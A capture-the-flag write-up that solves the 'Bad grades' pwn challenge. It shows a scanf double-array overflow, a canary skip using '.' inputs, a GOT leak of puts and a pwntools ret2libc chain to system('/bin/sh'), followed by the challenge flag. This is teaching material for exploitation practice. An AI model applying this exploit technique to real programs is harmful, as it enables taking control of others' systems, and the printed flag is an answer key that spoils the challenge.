# Bad grades

"You are not interested in studying for school anymore, you only play CTFs and challenges!  <br>
Your grades fell off a cliff! I will take your laptop away if you continue like this". You need to do something to raise them before your parents ground you forever..

# Solution

The challenge files are comprised of 2 elements:
- Bad grades binary
- Libc binary (a shared lib)

Lets start by analyzing how the **bad_grades** binary was compiled 
```bash
cmd: file bad_grades

bad_grades: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b60153cf4a14cf069c511baaae94948e073839fe, stripped

cmd: checksec --file=bad_grades
RELRO         - Full RELRO     
STACK CANARY  - Canary found       
NX            - NX enabled
PIE           - No pie          
RPATH         - No RPATH      
RUNPATH       - No RUNPATH             
Symbols       - No Symbols      
FORTIFY       - No  
Fortified     - 0  
Fortifiable   - 1      
FILE          - bad_grades      
``` 

First bad news: the binary is stripped, has canaries and cannot execute shell code in the stack <br>

The strategy for exploitation, since we have a libc, is certainly the following:
1. Find a format string vulnerability
2. Leak the canary
3. Leak libc base address
4. Return to libc

Before jumping into the disassembly, lets see how the program behaves <br>

```sql
Your grades this semester were really good BAD!

1. View current grades.
2. Add new.
> 1

Your grades were: 
2
4
1
3
0

You need to try HARDER!
-- program exited here

------------------------------------------------------
Your grades this semester were really good BAD!

1. View current grades.
2. Add new.
> 2

Number of grades: 2
Grade [1]: 12\n
Grade [2]: Your new average is: 6.00

``` 

We can see that the behaviour is odd and not correct, there are more forms of breaking it
```sql 
Number of grades: AAAAAAAAAAAAAAAAAAAAA
Your new average is: -nan

``` 

Very large numbers dont break it as well as negative numbers (at least, it seems) <br>

Lets jump into the code, shall we?! <br>

After some poking around we can see that the **main** function is located @ **0x00401108** (you can get here by checking the ELF's entry point or via the entry function) <br>

Further checking, we can distinguish both options and their respective functions (i called them **print_grades** and **add_grades** for options **1** and **2** respectively) <br>

The interesting stuff resides in the **add_grades** function
```c++
// -- snip --
double new_grades [33];

// -- snip --
__isoc99_scanf("%d",(double *)&stack0xfffffffffffffed8); // this stack0xf is the same as the n_grades below
i = 0;
while (i < n_grades) {
    printf("Grade [%d]: ",(ulong)(i + 1));
                /* %lf */
    __isoc99_scanf("%lf",new_grades + i);
    deci_0.0 = new_grades[i] + deci_0.0;
    i = i + 1;
}
printf("Your new average is: %.2f\n"); // does not show the remaining because it is using the xmm register and thus it would need some corrections to the analyzer signatures

if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) { // just canary checking
    __stack_chk_fail();
  }
```

So we can clearly see that an overflow occurs if we supply more than 33 grades ! Awesome :D <br>

The next point of struggle for me ( where i ended up asking for a hint) was to find how to actually leverage this BOF and overwrite the **ret** address <br>

First, i needed to find [this article](https://rehex.ninja/posts/scanf-and-hateful-dot/). The basic idea is that **scanf** has some special characters that ignore the current reading when reading numerical values, for example
```c
double x = 10;
scanf("%lf", &x); // with an input of '.', '+', '-'
printf("%lf", x);  // output still 10
```

So, with this finding, we already know how to bypass the canary when overflowing the buffer ! GREAT! <br>

**Note:** With some verifications with gdb, it is identifiable: 
- **canary @ 34th** grade entry
- **rbp @ 35th**
- **ret @ 36th** 

The next big set back was: How do i freakin write addresses with a float value <br>

Why this is a problem? well, if you send just packed bytes (the new ret address), scanf will not store them how you'd like! <br>

Converting the addresses to double wont work either, because they are stored somewhere else and not directly in the stack <br>

Luckly, a great guy helped me understanding how to solve this 

```py
def get_ready(raw_data):
    val = p64(raw_data).hex()
    return (struct.unpack("d", bytes.fromhex(val))[0])
```

How this works is:
- Get an hex value of your choosing 
- Pack it
- Get the packing hexadecimal value
- Unpack it to double !! (not float, there is differences between c and python double/float types)

Now we are able to write whatever we want to the ret address :D <br>

Since the challenge provides a **libc** elf file, it is pretty obvious what we need to do:
- Leak a libc address
- Ret2Libc

I'll leave my **exploit** in this notes directory but, and depending on how many entries you want to write in memory, you need to increase the number of new grades accordingly

```py
# To leak puts address
payloads = [
    get_ready(rop.find_gadget(["pop rdi"])[0]),
    get_ready(elf.got["puts"]),
    get_ready(elf.plt["puts"]),
    get_ready(main_addr) # this address is whatever you want, could've been the add_grades function
]

"""
number of entries needed
-> We know that ret @ 35th entry
-> number of grades needed = 39
def exploit_it(payloads, grades_count, go_interactive = False )
"""
exploit_it(payloads, b"39") # this is just a wrapper for recvs and sends, basically i jump to main after the leak so i dont need to modify the initial structure
```

Great, we know now have the needed information
```s
[CRITICAL] Leak received --> 0x7fb11a0bbaa0                                                        
[CRITICAL] Libc rebased @ 0x7fb11a03b000
```

Now lets Return to libc !! <br>

**Note:** I had some problems when creating a pwntools rop for the libc after rebasing it, so i created the rop object at the start and just added the calculated base address to the offset

```py
# this is the system('/bin/sh') rop chain
pop_rdi = libc_elf.address +  rop2.find_gadget(["pop rdi", "ret"])[0]
bin_sh  = next(libc_elf.search(b"/bin/sh"))
extra_ret = libc_elf.address + rop2.find_gadget(["ret"])[0] # i aligned the stack here
system_addr = libc_elf.symbols.system

payloads = [
    get_ready(pop_rdi),
    get_ready(bin_sh),
    get_ready(extra_ret),
    get_ready(system_addr)
]

exploit_it(payloads, b"39", True)
```

I had the need to tinker with the stack alignment because it was segfaulting, you might need as well ! <br>

We got it :D

```bash
cmd: whoami && id 
ctf
uid=999(ctf) gid=999(ctf) groups=999(ctf)

cmd: ls
bad_grades
flag.txt
libc.so.6
run_challenge.sh

cmd: cat flag.txt
# Flag: HTB{c4n4ry_1s_4fr41d_0f_s1gn3d_numb3r5}
```